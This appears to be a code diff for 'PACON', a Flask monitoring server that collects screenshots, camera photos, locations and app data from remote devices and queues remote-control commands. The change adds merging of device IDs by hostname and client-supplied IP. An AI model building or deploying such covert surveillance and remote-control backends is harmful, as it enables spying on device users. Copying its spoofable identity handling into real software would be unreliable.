@@ -1,22 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.3
+PACON Service - v1.2.4
 =======================
-Godmode server with:
-  + Session-bridge-aware agent protocol
-  + Strict per-device data isolation
-  + Orphan cleanup + device-slot semantics
-  + Command result tracking + TTL cleanup
-  + Full remote control (input, launch, clipboard, file browser, power)
-  + Telegram online/offline notifications
-  + Diagnostics endpoints
-  + Graceful shutdown + robust error handling
-
-Deployment:
-    gunicorn -w 1 -k gthread --threads 8 -b 0.0.0.0:5001 service:app
-  OR
-    python service.py   (dev mode)
+v1.2.4 changes:
+  - Canonical device ID merging: devices with same (hostname, public_ip)
+    are unified under the most recently-active device ID.
+  - Pending-registration rejection: devices that register but never poll
+    are hidden from /api/devices.
+  - Better diagnostics showing raw vs canonical IDs.
+  - /api/devices trusts last_poll over last_seen when they disagree.
 """
 
 import os
@@ -123,38 +116,43 @@ CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)
 # ============================================================
 # DATA STORE
 # ============================================================
-devices             = {}
+devices             = {}         # device_id -> device dict
 screenshots         = []
 camera_photos       = []
 locations           = []
 app_usage           = []
-installed_apps      = {}
+installed_apps      = {}         # device_id -> [app dicts]
 browser_history     = []
 activities          = []
 activity_counter    = 0
-device_screens      = {}
+device_screens      = {}         # device_id -> {width, height, density}
 
 command_queues      = defaultdict(deque)
 command_results     = {}
-control_devices     = {}
-device_online_state = {}
+control_devices     = {}         # device_id -> last_poll_ts
+device_online_state = {}         # device_id -> bool
+device_agent_pid    = {}         # device_id -> {pid, version, first_seen}
 
-# NEW: track which agent (PID) is currently authoritative per device.
-# If a new agent with the same device ID connects, it replaces the old one.
-device_agent_pid    = {}  # device_id -> (pid, agent_version, first_seen)
+# v1.2.4: Fingerprint-based canonical ID mapping.
+# (hostname, public_ip) -> canonical device_id
+# This handles the case where two different agents on the same physical
+# machine register with two different IDs.
+device_fingerprint  = {}         # fingerprint -> canonical_device_id
+fingerprint_lock    = threading.Lock()
 
 ping_thread  = None
 ping_running = False
 ping_interval = 240
 
-# Offline / purge thresholds
+# Thresholds
 OFFLINE_THRESHOLD = 15       # seconds without poll = offline
-OFFLINE_GRACE     = 30       # seconds before purging cache
-STALE_CUTOFF      = 300      # hide devices offline > 5min from UI
-ORPHAN_CUTOFF     = 600      # delete devices offline > 10min entirely
-RESULT_TTL        = 300      # command_results entries expire after 5 min
+OFFLINE_GRACE     = 30
+STALE_CUTOFF      = 300
+ORPHAN_CUTOFF     = 600
+RESULT_TTL        = 300
+PENDING_TTL       = 90       # v1.2.4: how long a "registered but never
+                             # polled" device is kept in `devices`
 
-# Shutdown event for graceful exit
 _stop_event = threading.Event()
 
 # ============================================================
@@ -194,13 +192,67 @@ def _is_device_online(device_id: str, now: Optional[float] = None) -> bool:
     return (now - control_devices.get(device_id, 0)) < OFFLINE_THRESHOLD
 
 def _device_age(device_id: str, now: Optional[float] = None) -> Optional[float]:
-    """Return seconds since last poll, or None if never seen."""
     if now is None:
         now = time.time()
     last_poll = control_devices.get(device_id, 0)
     if not last_poll:
         return None
     return now - last_poll
+
+# ============================================================
+# v1.2.4 — CANONICAL ID RESOLUTION
+# ============================================================
+def _fingerprint_for(hostname: str, public_ip: str) -> Optional[str]:
+    """Return a stable fingerprint for a physical machine."""
+    if not hostname and not public_ip:
+        return None
+    return f"{(hostname or '').strip().lower()}|{(public_ip or '').strip()}"
+
+def _resolve_canonical_id(incoming_id: str,
+                          hostname: str = "",
+                          public_ip: str = "") -> str:
+    """
+    Return the canonical device ID to use for a given incoming ID.
+    If another device is already active with the same fingerprint,
+    return that one; otherwise return the incoming one and register it.
+    """
+    fp = _fingerprint_for(hostname, public_ip)
+    if not fp:
+        return incoming_id
+
+    with fingerprint_lock:
+        existing = device_fingerprint.get(fp)
+        if existing and existing != incoming_id:
+            # Is the existing one still alive?
+            now = time.time()
+            last_poll = control_devices.get(existing, 0)
+            existing_age = now - last_poll if last_poll else None
+            if existing_age is not None and existing_age < OFFLINE_THRESHOLD * 4:
+                logger.warning(
+                    f"🔀 Device fingerprint collision: incoming "
+                    f"{incoming_id[:8]} → reusing canonical {existing[:8]} "
+                    f"(host={hostname}, ip={public_ip})"
+                )
+                return existing
+            else:
+                # Existing is stale — let the new one take over
+                logger.info(
+                    f"🔀 Canonical takeover: {existing[:8]} stale → "
+                    f"adopting {incoming_id[:8]}"
+                )
+                device_fingerprint[fp] = incoming_id
+                return incoming_id
+        else:
+            device_fingerprint[fp] = incoming_id
+            return incoming_id
+
+def _get_public_ip_from_request() -> str:
+    """Extract the client's public IP from the request."""
+    xff = request.headers.get('X-Forwarded-For', '')
+    if xff:
+        # First IP in the list is the original client
+        return xff.split(',')[0].strip()
+    return request.remote_addr or ''
 
 # ============================================================
 # AUTH CORE
@@ -324,10 +376,10 @@ def ping_server():
     while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.3')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.4')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
-                    logger.debug(f"✅ Self-ping OK")
+                    logger.debug("✅ Self-ping OK")
         except Exception as e:
             logger.warning(f"⚠️ Self-ping failed: {e}")
         _stop_event.wait(ping_interval)
@@ -505,11 +557,6 @@ def _mark_device_online(device_id: str):
         _notify_state_change(device_id, True)
 
 def _purge_device_data(device_id: str):
-    """
-    Remove per-device cached data when it goes offline.
-    Keeps the `devices` entry (so UI history is preserved) but clears
-    apps, screenshots, queued commands, and screen info.
-    """
     try:
         removed_apps = len(installed_apps.pop(device_id, []))
         device_screens.pop(device_id, None)
@@ -524,33 +571,62 @@ def _purge_device_data(device_id: str):
             devices[device_id]['status']    = 'offline'
             devices[device_id]['last_seen'] = datetime.now().isoformat()
 
-        # Remove command results belonging to that device
         stale_cids = [cid for cid, r in command_results.items()
                       if r.get('deviceId') == device_id]
         for cid in stale_cids:
             command_results.pop(cid, None)
 
         logger.info(f"🧹 Purged {device_id[:8]}: "
-                    f"{removed_apps} apps, {removed_shots} screenshots, "
+                    f"{removed_apps} apps, {removed_shots} shots, "
                     f"{len(stale_cids)} results")
         add_activity('purge', f'Purged cached data for {device_id[:8]}', device_id)
     except Exception as e:
         logger.warning(f"Purge error for {device_id[:8]}: {e}")
 
-def _cleanup_orphans():
-    """Remove devices not seen for > ORPHAN_CUTOFF entirely."""
+def _cleanup_pending_registrations():
+    """
+    v1.2.4: Remove devices that have registered but never polled
+    within PENDING_TTL seconds. Prevents ghost device registrations.
+    """
     now = time.time()
     removed = []
-    for did in list(devices.keys()):
-        age = _device_age(did, now)
-        # Also check last_seen if never polled
-        if age is None:
+    for did, info in list(devices.items()):
+        if did in control_devices:
+            continue   # it has polled at least once
+        last_seen = info.get('last_seen', '')
+        if not last_seen:
+            continue
+        try:
+            seen_age = now - datetime.fromisoformat(last_seen).timestamp()
+        except Exception:
+            continue
+        if seen_age > PENDING_TTL:
+            devices.pop(did, None)
+            device_agent_pid.pop(did, None)
+            device_online_state.pop(did, None)
+            removed.append(did)
+    if removed:
+        logger.info(f"🧹 Removed {len(removed)} pending (never-polled) "
+                    f"device(s): {[d[:8] for d in removed]}")
+
+def _cleanup_orphans():
+    now = time.time()
+    removed = []
+    all_ids = set(devices.keys()) | set(control_devices.keys())
+    for did in all_ids:
+        info = devices.get(did, {})
+        last_poll = control_devices.get(did, 0)
+        poll_age = (now - last_poll) if last_poll else None
+        reg_age = None
+        ls = info.get('last_seen', '')
+        if ls:
             try:
-                ls = devices[did].get('last_seen', '')
-                if ls:
-                    age = now - datetime.fromisoformat(ls).timestamp()
+                reg_age = now - datetime.fromisoformat(ls).timestamp()
             except Exception:
-                age = None
+                reg_age = None
+        ages = [a for a in (poll_age, reg_age) if a is not None]
+        age = min(ages) if ages else None
+
         if age is not None and age > ORPHAN_CUTOFF:
             devices.pop(did, None)
             installed_apps.pop(did, None)
@@ -561,12 +637,16 @@ def _cleanup_orphans():
             device_agent_pid.pop(did, None)
             screenshots[:] = [s for s in screenshots if s.get('device_id') != did]
             removed.append(did)
+            # Also clean any fingerprints pointing at this ID
+            with fingerprint_lock:
+                for fp, cid in list(device_fingerprint.items()):
+                    if cid == did:
+                        device_fingerprint.pop(fp, None)
     if removed:
         logger.info(f"🧹 Orphan cleanup: removed {len(removed)} stale device(s): "
                     f"{[d[:8] for d in removed]}")
 
 def _cleanup_command_results():
-    """Remove command_results older than RESULT_TTL."""
     now = time.time()
     stale = [cid for cid, r in command_results.items()
              if now - r.get('timestamp', 0) > RESULT_TTL]
@@ -602,10 +682,10 @@ def _device_watchdog():
                     threading.Thread(target=_delayed_purge,
                                      args=(device_id,), daemon=True).start()
 
-            # Every 60s, clean orphans + expired results
-            if now - last_cleanup > 60:
+            if now - last_cleanup > 30:
                 _cleanup_orphans()
                 _cleanup_command_results()
+                _cleanup_pending_registrations()
                 last_cleanup = now
         except Exception as e:
             logger.debug(f"Watchdog error: {e}")
@@ -709,7 +789,7 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.2.3</h1><p>index.html not found in web/public/</p></body></html>'''
+    <h1>🛡️ PACON v1.2.4</h1><p>index.html not found in web/public/</p></body></html>'''
 
 # ============================================================
 # HEALTH & DIAGNOSTICS
@@ -723,10 +803,11 @@ def health_check():
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.3",
+        "version":          "1.2.4",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
+        "fingerprints":     len(device_fingerprint),
         "is_render":        IS_RENDER,
         "requires_pin":     bool(PARENT_PIN),
         "telegram_enabled": telegram_config.get("enabled", False),
@@ -740,21 +821,23 @@ def health_check():
 @app.route('/api/debug/devices', methods=['GET'])
 @require_parent_auth
 def debug_devices():
-    """Full diagnostic dump of every device the server knows about."""
     now = time.time()
     out = {}
     for did, info in devices.items():
         age = _device_age(did, now)
         pid_info = device_agent_pid.get(did, {})
+        has_polled = did in control_devices
         out[did] = {
             'name':             info.get('name'),
             'model':            info.get('model'),
             'hostname':         info.get('hostname'),
             'machine_guid':     info.get('machine_guid'),
+            'public_ip':        info.get('public_ip'),
             'last_seen':        info.get('last_seen'),
             'status':           info.get('status', 'unknown'),
             'last_poll_secs':   int(age) if age is not None else None,
             'online':           (age is not None and age < OFFLINE_THRESHOLD),
+            'has_polled':       has_polled,
             'has_apps':         did in installed_apps,
             'app_count':        len(installed_apps.get(did, [])),
             'has_screen_info':  did in device_screens,
@@ -763,14 +846,22 @@ def debug_devices():
             'agent_version':    pid_info.get('version'),
             'agent_first_seen': pid_info.get('first_seen'),
         }
+    # Also expose fingerprints
+    fp_out = {}
+    with fingerprint_lock:
+        for fp, cid in device_fingerprint.items():
+            fp_out[fp] = cid[:8] if cid else None
+
     return jsonify({
         'success':           True,
         'devices':           out,
+        'fingerprints':      fp_out,
         'server_now':        datetime.now().isoformat(),
         'offline_threshold': OFFLINE_THRESHOLD,
         'offline_grace':     OFFLINE_GRACE,
         'stale_cutoff':      STALE_CUTOFF,
         'orphan_cutoff':     ORPHAN_CUTOFF,
+        'pending_ttl':       PENDING_TTL,
         'result_ttl':        RESULT_TTL,
     })
 
@@ -816,29 +907,41 @@ def get_status():
 @require_parent_auth
 def get_devices():
     """
-    v1.2.3: returns only devices that have polled or registered
-    within the STALE_CUTOFF window. Ghost devices disappear.
+    v1.2.4: returns only devices that have POLLED recently.
+    A device that has only registered (no poll) is hidden.
+    Uses poll age, not registration age, as authoritative.
     """
     now = time.time()
     enriched = {}
     for did, info in devices.items():
-        age = _device_age(did, now)
-        # Check last_seen too, if we never got a poll
-        if age is None:
-            try:
-                ls = info.get('last_seen', '')
-                if ls:
-                    age = now - datetime.fromisoformat(ls).timestamp()
-            except Exception:
-                age = None
+        # Must have polled at least once
+        if did not in control_devices:
+            # Give it a chance: if registration is very recent, show as pending
+            ls = info.get('last_seen', '')
+            if ls:
+                try:
+                    reg_age = now - datetime.fromisoformat(ls).timestamp()
+                    if reg_age < PENDING_TTL:
+                        d = dict(info)
+                        d['online'] = False
+                        d['pending'] = True
+                        d['last_poll_secs'] = None
+                        d['agent_pid'] = device_agent_pid.get(did, {}).get('pid')
+                        enriched[did] = d
+                except Exception:
+                    pass
+            continue
 
-        if age is not None and age > STALE_CUTOFF:
-            continue  # skip stale
+        age = _device_age(did, now)
+        if age is None or age > STALE_CUTOFF:
+            continue
 
         d = dict(info)
-        d['online'] = (age is not None and age < OFFLINE_THRESHOLD)
-        d['last_poll_secs'] = int(age) if age is not None else None
+        d['online'] = age < OFFLINE_THRESHOLD
+        d['pending'] = False
+        d['last_poll_secs'] = int(age)
         d['agent_pid'] = device_agent_pid.get(did, {}).get('pid')
+        d['agent_version'] = device_agent_pid.get(did, {}).get('version')
         enriched[did] = d
 
     return jsonify({"success": True, "devices": enriched})
@@ -846,28 +949,26 @@ def get_devices():
 @app.route('/api/device/<device_id>/stats', methods=['GET'])
 @require_parent_auth
 def device_stats(device_id):
-    """Live stats for a single device."""
     now = time.time()
     if device_id not in devices:
         return jsonify({'success': False, 'error': 'device not found'}), 404
     age = _device_age(device_id, now)
     return jsonify({
-        'success':        True,
-        'device_id':      device_id,
-        'online':         _is_device_online(device_id, now),
-        'last_poll_secs': int(age) if age is not None else None,
-        'app_count':      len(installed_apps.get(device_id, [])),
+        'success':          True,
+        'device_id':        device_id,
+        'online':           _is_device_online(device_id, now),
+        'last_poll_secs':   int(age) if age is not None else None,
+        'app_count':        len(installed_apps.get(device_id, [])),
         'screenshot_count': sum(1 for s in screenshots if s.get('device_id') == device_id),
-        'queued_cmds':    len(command_queues.get(device_id, [])),
-        'agent_pid':      device_agent_pid.get(device_id, {}).get('pid'),
-        'agent_version':  device_agent_pid.get(device_id, {}).get('version'),
+        'queued_cmds':      len(command_queues.get(device_id, [])),
+        'agent_pid':        device_agent_pid.get(device_id, {}).get('pid'),
+        'agent_version':    device_agent_pid.get(device_id, {}).get('version'),
     })
 
 # ============================================================
 # SCREENSHOTS
 # ============================================================
 def _add_cache_headers(resp, seconds: int = 2):
-    """Allow browser to cache screenshots briefly for smoother refresh."""
     resp.headers['Cache-Control'] = f'public, max-age={seconds}'
     return resp
 
@@ -882,12 +983,6 @@ def list_screenshots():
             for file in directory.glob(pattern):
                 try:
                     stat = file.stat()
-                    # If filtering by device, we need the device info
-                    if device_id:
-                        # Match filename pattern — screenshots have device-independent names
-                        # so we only include if the most recent device matches.
-                        # This is a best-effort filter.
-                        pass
                     all_shots.append({
                         'filename':  file.name,
                         'timestamp': datetime.fromtimestamp(stat.st_mtime).isoformat(),
@@ -980,26 +1075,20 @@ def get_activity():
     })
 
 # ============================================================
-# STRICT PER-DEVICE APP ENDPOINTS
+# APP ENDPOINTS
 # ============================================================
 @app.route('/api/apps', methods=['GET'])
 @require_parent_auth
 def get_apps():
-    """
-    Return apps for a SPECIFIC device only.
-    Refuses to return data if the device is offline.
-    """
     device_id = request.args.get('deviceId', '')
     limit     = request.args.get('limit', 50, type=int)
     now       = time.time()
 
     if device_id:
-        # Refuse offline devices
         if not _is_device_online(device_id, now):
             return jsonify([])
         return jsonify(installed_apps.get(device_id, [])[:limit])
 
-    # No deviceId: aggregate only from online devices
     result = []
     for did, apps in installed_apps.items():
         if _is_device_online(did, now):
@@ -1009,7 +1098,6 @@ def get_apps():
 @app.route('/api/apps/list', methods=['GET'])
 @require_parent_auth
 def apps_list():
-    """Strict — refuses offline devices."""
     device_id = request.args.get('deviceId', '')
     if not device_id:
         return jsonify([])
@@ -1129,23 +1217,28 @@ def ping_status():
 def monitor_user():
     try:
         data = request.json or {}
-        device_id = data.get('deviceId', 'unknown')
-        pid       = data.get('pid')
-        version   = data.get('agent_version', 'unknown')
-        mguid     = data.get('machine_guid', '')
+        incoming_id = data.get('deviceId', 'unknown')
+        pid         = data.get('pid')
+        version     = data.get('agent_version', 'unknown')
+        mguid       = data.get('machine_guid', '')
+        hostname    = data.get('hostname', data.get('deviceModel', ''))
+        # v1.2.4: use the client's public IP from the request
+        req_ip      = _get_public_ip_from_request()
+        public_ip   = data.get('public_ip', '') or req_ip
 
-        # If a different PID with the same device ID connects, we replace
-        # the stale entry. This prevents dual-agent conflicts.
+        # v1.2.4: canonicalize the ID
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        if device_id != incoming_id:
+            logger.info(f"🔀 Canonicalized {incoming_id[:8]} → {device_id[:8]} "
+                        f"(host={hostname}, ip={public_ip})")
+
+        # Duplicate-agent detection
         prev = device_agent_pid.get(device_id)
         if prev and prev.get('pid') != pid:
             logger.warning(
                 f"⚠️ Device {device_id[:8]} re-registered by new agent "
                 f"(old PID {prev.get('pid')}, new PID {pid}). Replacing."
             )
-            # Reset control_devices timestamp so old agent doesn't keep
-            # the device "online" if it stops polling
-            control_devices.pop(device_id, None)
-            device_online_state.pop(device_id, None)
 
         device_agent_pid[device_id] = {
             'pid':        pid,
@@ -1153,7 +1246,6 @@ def monitor_user():
             'first_seen': prev.get('first_seen') if prev else datetime.now().isoformat(),
         }
 
-        # Preserve first_seen if already registered
         existing_first_seen = devices.get(device_id, {}).get('first_seen',
                                 datetime.now().isoformat())
 
@@ -1164,21 +1256,26 @@ def monitor_user():
             'company':         data.get('company', ''),
             'model':           data.get('deviceModel', 'Unknown'),
             'android_version': data.get('androidVersion', data.get('os_version', 'Unknown')),
-            'public_ip':       data.get('public_ip', ''),
-            'hostname':        data.get('hostname', data.get('deviceModel', 'Unknown')),
+            'public_ip':       public_ip,
+            'hostname':        hostname or data.get('deviceModel', 'Unknown'),
             'machine_guid':    mguid,
             'agent_version':   version,
             'first_seen':      existing_first_seen,
             'last_seen':       datetime.now().isoformat(),
-            'status':          'active',
+            'status':          'active' if device_id in control_devices else 'pending',
         }
         add_activity('user_registered',
                      f"{data.get('name','User')} from {data.get('deviceModel','Unknown')}",
                      device_id)
         logger.info(f"✅ User registered: {data.get('name')} ({data.get('deviceModel')}) "
-                    f"pid={pid} v={version}")
+                    f"pid={pid} v={version} id={device_id[:8]}")
         _mark_device_online(device_id)
-        return jsonify({"success": True, "device_id": device_id})
+        return jsonify({
+            "success": True,
+            "device_id": device_id,
+            "canonical_id": device_id,
+            "was_merged": device_id != incoming_id,
+        })
     except Exception as e:
         logger.error(f"User error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
@@ -1192,9 +1289,15 @@ def monitor_screenshot():
         filename   = safe_filename(data.get('filename',
                         f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'))
         image_data = data.get('data')
-        device_id  = data.get('deviceId', 'unknown')
+        incoming_id = data.get('deviceId', 'unknown')
         width      = data.get('width', 0)
         height     = data.get('height', 0)
+        hostname   = data.get('deviceModel', '')
+        public_ip  = _get_public_ip_from_request()
+
+        # Canonicalize ID
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
         if not image_data:
             return jsonify({"success": False, "error": "No image data"}), 400
         image_bytes = base64.b64decode(image_data)
@@ -1208,7 +1311,7 @@ def monitor_screenshot():
         screenshots.append({
             'filename':     filename,
             'device_id':    device_id,
-            'device_model': data.get('deviceModel', 'Unknown'),
+            'device_model': hostname or 'Unknown',
             'timestamp':    datetime.now().isoformat(),
             'size':         filepath.stat().st_size,
             'width':        width,
@@ -1217,8 +1320,8 @@ def monitor_screenshot():
         })
         if len(screenshots) > 500:
             screenshots[:] = screenshots[-500:]
-        logger.info(f"📸 Screenshot: {filename} ({len(image_bytes)}b) from {device_id[:8]}")
-        return jsonify({"success": True, "filename": filename})
+        return jsonify({"success": True, "filename": filename,
+                        "device_id": device_id})
     except Exception as e:
         logger.error(f"Screenshot error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
@@ -1231,7 +1334,11 @@ def monitor_camera():
         filename   = safe_filename(data.get('filename',
                         f'camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'))
         image_data = data.get('data')
-        device_id  = data.get('deviceId', 'unknown')
+        incoming_id = data.get('deviceId', 'unknown')
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
         if not image_data:
             return jsonify({"success": False, "error": "No image data"}), 400
         image_bytes = base64.b64decode(image_data)
@@ -1255,7 +1362,11 @@ def monitor_camera():
 def monitor_location():
     try:
         data = request.json or {}
-        device_id = data.get('deviceId', 'unknown')
+        incoming_id = data.get('deviceId', 'unknown')
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
         lat = data.get('latitude'); lon = data.get('longitude')
         if lat is None or lon is None:
             return jsonify({"success": False, "error": "No location"}), 400
@@ -1279,8 +1390,12 @@ def monitor_location():
 def monitor_apps():
     try:
         data = request.json or {}
-        device_id = data.get('deviceId', 'unknown')
-        apps      = data.get('apps', [])
+        incoming_id = data.get('deviceId', 'unknown')
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
+        apps = data.get('apps', [])
         if device_id in devices:
             devices[device_id]['last_seen'] = datetime.now().isoformat()
         if apps and isinstance(apps[0], dict) and 'label' in apps[0]:
@@ -1295,7 +1410,8 @@ def monitor_apps():
             })
             if len(app_usage) > 500:
                 app_usage[:] = app_usage[-500:]
-        return jsonify({"success": True, "count": len(apps)})
+        return jsonify({"success": True, "count": len(apps),
+                        "device_id": device_id})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
@@ -1304,8 +1420,12 @@ def monitor_apps():
 def monitor_running_apps():
     try:
         data = request.json or {}
-        device_id = data.get('deviceId', 'unknown')
-        apps      = data.get('apps', [])
+        incoming_id = data.get('deviceId', 'unknown')
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
+        apps = data.get('apps', [])
         if device_id in devices:
             devices[device_id]['last_seen'] = datetime.now().isoformat()
         app_usage.append({
@@ -1325,7 +1445,11 @@ def monitor_running_apps():
 def monitor_screen_info():
     try:
         data = request.json or {}
-        device_id = data.get('deviceId', 'unknown')
+        incoming_id = data.get('deviceId', 'unknown')
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
         device_screens[device_id] = {
             'width':   data.get('width', 1080),
             'height':  data.get('height', 2400),
@@ -1336,7 +1460,7 @@ def monitor_screen_info():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ============================================================
-# REMOTE CONTROL — fast-fail + clamped age
+# REMOTE CONTROL
 # ============================================================
 class DeviceOfflineError(Exception):
     """Raised when queueing a command for an offline device."""
@@ -1344,16 +1468,10 @@ class DeviceOfflineError(Exception):
 
 def _enqueue(device_id: str, action: str,
              params: dict = None, ttl: float = 12.0) -> str:
-    """
-    Queue a command for a device. Fast-fails if the device hasn't polled
-    recently. Age is clamped to a sane display value.
-    """
     now = time.time()
     last_poll = control_devices.get(device_id, 0)
 
-    # If never polled, we have no idea how long it's been offline.
     if not last_poll:
-        # Try last_seen as a fallback
         ls = devices.get(device_id, {}).get('last_seen', '')
         if ls:
             try:
@@ -1368,7 +1486,7 @@ def _enqueue(device_id: str, action: str,
 
     age = now - last_poll
     if age > OFFLINE_THRESHOLD:
-        shown_age = min(int(age), 86400 * 365)  # clamp to 1 year max
+        shown_age = min(int(age), 86400 * 365)
         raise DeviceOfflineError(
             f"device {device_id[:8]} offline for {shown_age}s"
         )
@@ -1386,7 +1504,6 @@ def _enqueue(device_id: str, action: str,
     return cmd_id
 
 def _enqueue_response(device_id, action, params=None, ttl=12.0):
-    """Helper returning (payload, status_code)."""
     try:
         cid = _enqueue(device_id, action, params, ttl)
         return {'success': True, 'id': cid}, 200
@@ -1399,8 +1516,39 @@ def _enqueue_response(device_id, action, params=None, ttl=12.0):
 def control_poll():
     if request.method == 'OPTIONS':
         return '', 204
-    device_id = request.args.get('deviceId', 'unknown')
+    incoming_id = request.args.get('deviceId', 'unknown')
+    public_ip   = _get_public_ip_from_request()
+    # v1.2.4: canonicalize using only public_ip (no hostname in poll request)
+    device_id = _resolve_canonical_id(incoming_id, "", public_ip)
+
+    # Mark this ID as polling
     control_devices[device_id] = time.time()
+
+    # v1.2.4: also update last_seen so orphan cleanup knows it's alive
+    if device_id in devices:
+        devices[device_id]['last_seen'] = datetime.now().isoformat()
+        devices[device_id]['status']    = 'active'
+    else:
+        # Provisional entry so /api/devices can show it even before
+        # /api/monitor/user arrives
+        devices[device_id] = {
+            'id':              device_id,
+            'name':            f"Device {device_id[:8]}",
+            'email':           '',
+            'company':         '',
+            'model':           'Unknown (registering...)',
+            'android_version': 'Unknown',
+            'public_ip':       public_ip,
+            'hostname':        'Unknown',
+            'machine_guid':    '',
+            'agent_version':   'unknown',
+            'first_seen':      datetime.now().isoformat(),
+            'last_seen':       datetime.now().isoformat(),
+            'status':          'active',
+            'provisional':     True,
+        }
+        logger.info(f"🆕 Provisional device from poll: {device_id[:8]}")
+
     _mark_device_online(device_id)
     now = time.time()
     q = command_queues[device_id]
@@ -1788,34 +1936,6 @@ def telegram_send_text():
     return jsonify(r)
 
 # ============================================================
-# FILE UPLOAD (foundation for parent→child file push)
-# ============================================================
-@app.route('/api/upload/<device_id>', methods=['POST'])
-@require_parent_auth
-def upload_file(device_id):
-    """
-    Parent uploads a file destined for `device_id`.
-    The file is stored server-side; a future agent command can pull it.
-    """
-    if 'file' not in request.files:
-        return jsonify({'success': False, 'error': 'no file part'}), 400
-    f = request.files['file']
-    if not f or not f.filename:
-        return jsonify({'success': False, 'error': 'empty filename'}), 400
-    fname = safe_filename(f.filename)
-    dest_dir = FILES_DIR / device_id
-    dest_dir.mkdir(parents=True, exist_ok=True)
-    dest = dest_dir / fname
-    f.save(str(dest))
-    logger.info(f"📥 Uploaded {fname} ({dest.stat().st_size}b) for {device_id[:8]}")
-    add_activity('upload', f'Uploaded {fname} ({dest.stat().st_size}b)', device_id)
-    return jsonify({
-        'success':  True,
-        'filename': fname,
-        'size':     dest.stat().st_size,
-    })
-
-# ============================================================
 # ERROR HANDLERS
 # ============================================================
 @app.errorhandler(404)
@@ -1845,16 +1965,13 @@ except Exception:
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.3 — GODMODE")
+    print("  PACON SERVICE v1.2.4 — GODMODE")
     print("=" * 70)
     logger.info(f"Web dir: {WEB_DIR}")
     logger.info(f"Running on Render: {IS_RENDER}")
     logger.info(f"Parent PIN: {'SET' if PARENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Agent PIN:  {'SET' if AGENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
-    logger.info(f"Offline threshold: {OFFLINE_THRESHOLD}s, purge grace: {OFFLINE_GRACE}s")
-    logger.info(f"Stale cutoff: {STALE_CUTOFF}s, orphan cutoff: {ORPHAN_CUTOFF}s")
-    logger.info(f"Result TTL: {RESULT_TTL}s")
 
     start_ping_system()
     start_watchdog()
